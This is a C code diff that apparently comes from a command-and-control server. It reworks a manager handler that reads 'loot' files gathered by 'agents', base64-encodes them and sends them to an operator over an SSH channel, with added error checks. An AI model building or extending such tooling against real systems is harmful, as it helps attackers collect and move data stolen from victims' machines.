@@ -211,6 +211,7 @@ void manager_handler(struct clientNode *node){
     int size_e = 0;
     int read = 0;
     int count = 0;
+    int ctr = 0;
     char *ptr = NULL;
     char *dat_ptr = NULL;
     char buff[BUFSIZ];
@@ -295,53 +296,126 @@ void manager_handler(struct clientNode *node){
                 }
             }
             closedir(dir);
+            sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), ptr);
             memset(name, 0, sizeof(name));
             sprintf(name, "%d", count);
-            ssh_channel_write(manager->chan, name, strlen(name));
-            ssh_channel_read(manager->chan, tmpbf, 3, 0);//rd
+            
+            rc = ssh_channel_write(manager->chan, name, strlen(name));
+            if(rc == SSH_ERROR){
+                printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                return;
+            }
+            
+            rc = ssh_channel_read(manager->chan, tmpbf, 3, 0);//rd
+            if(rc == SSH_ERROR){
+                printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                return;
+            }
 
+            if(count == 0) break;
+            
             if ((dir = opendir(buff)) != NULL) {
                 /* print all the files and directories within directory */
                 while ((ent = readdir (dir)) != NULL) {
                     if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                         continue;
                     } else {
-                        strcat(buff, "/");
-                        strcat(buff, ent->d_name);
-                        file = fopen(name, "r");
-                        ssh_channel_write(manager->chan, ent->d_name, sizeof(ent->d_name));
-                        ssh_channel_read(manager->chan, tmpbf, 3, 0); //ok
+                        read = 0;
+                        memset(buff, 0, sizeof(buff));
+                        sprintf(buff, "%s/agents/%s/loot/%s", getcwd(name, sizeof(name)), ptr, ent->d_name);
+                        file = fopen(buff, "r");
+                        
+                        rc = ssh_channel_write(manager->chan, ent->d_name, strlen(ent->d_name));
+                        if(rc == SSH_ERROR){
+                            printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                            return;
+                        }
+
+                        rc = ssh_channel_read(manager->chan, tmpbf, 3, 0); //ok
+                        if(rc == SSH_ERROR){
+                            printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                            return;
+                        }
+
                         if(file == NULL){
                             printf("Manager %s: Could not read loot file %s\n", manager->id, buff);
                             perror("Got here");
                         } else {
+                            ctr++;
                             memset(buff, 0, sizeof(buff));
                             printf("File opened successfully\n");
                             fseek(file, 0L, SEEK_END);
                             size = ftell(file);
-                            printf("Size: %d\n", size);
+                            size_e = b64_encoded_size(size);
                             rewind(file);
+                            char *tmp_ptr = malloc(size);
+                            memset(tmp_ptr, 0, size);
+                            fread(tmp_ptr, 1, size, file);
+                            char *tmp_ptr2 = b64_encode((unsigned char*)tmp_ptr, size);
                             memset(buff, 0, 256);
-                            sprintf(buff, "%d", size);
-                            ssh_channel_write(manager->chan, buff, strlen(buff));
-                            ssh_channel_read(manager->chan, tmpbf, 3, 0);//ok
-                            do
+                            sprintf(buff, "%d", size_e);
+                            
+                            rc = ssh_channel_write(manager->chan, buff, strlen(buff));
+                            if(rc == SSH_ERROR){
+                                printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                                return;
+                            }
+
+                            rc = ssh_channel_read(manager->chan, tmpbf, 3, 0);//ok
+                            if(rc == SSH_ERROR){
+                                printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                                return;
+                            }
+                            
+                            rc = ssh_channel_write(manager->chan, tmp_ptr2, strlen(tmp_ptr2));
+                            /*do
                             {
                                 memset(buff, 0, sizeof(buff));
-                                read += fread(buff, 1, size, file);
-                                ssh_channel_write(manager->chan, buff, sizeof(buff));
-                                ssh_channel_read(manager->chan, tmpbf, 3, 0);
-                                printf("Size: %d, read: %d\n", size, read);//ok
+                                size_e = b64_encoded_size(sizeof(buff));
                                 
-                            } while (read < size);
+                                
+                                
+                                if(rc == SSH_ERROR){
+                                    printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                                    return;
+                                }
 
-                            ssh_channel_write(manager->chan, "nx", 3);
-                            ssh_channel_read(manager->chan, tmpbf, 3, 0); //rd
+                                printf("Size: %d, Read: %d, Size_e: %d, \n", size, read, size_e);//ok
+                                
+                            } while (read < size);*/
+
+                            fclose(file);
+
+                            if (ctr >= count)
+                            {
+                                printf("Finished writing loot to channel\n");
+                                
+                                rc = ssh_channel_write(manager->chan, "fi", 3);
+                                if(rc == SSH_ERROR){
+                                    printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                                    return;
+                                }
+                                closedir(dir);
+                                break;
+                            }                             
+                            
+                            rc = ssh_channel_write(manager->chan, "nx", 3);
+                            if(rc == SSH_ERROR){
+                                printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                                return;
+                            }
+                            printf("wrote next\n");
+                            
+                            rc = ssh_channel_read(manager->chan, tmpbf, 3, 0); //rd
+                            if(rc == SSH_ERROR){
+                                printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                                return;
+                            }
+                            printf("Read from channel\n");
                         }
                     }
                 }
-                ssh_channel_write(manager->chan, "fi", 2);
-                closedir (dir);
+                
             } else {
                 /* could not open directory */
                 perror ("");
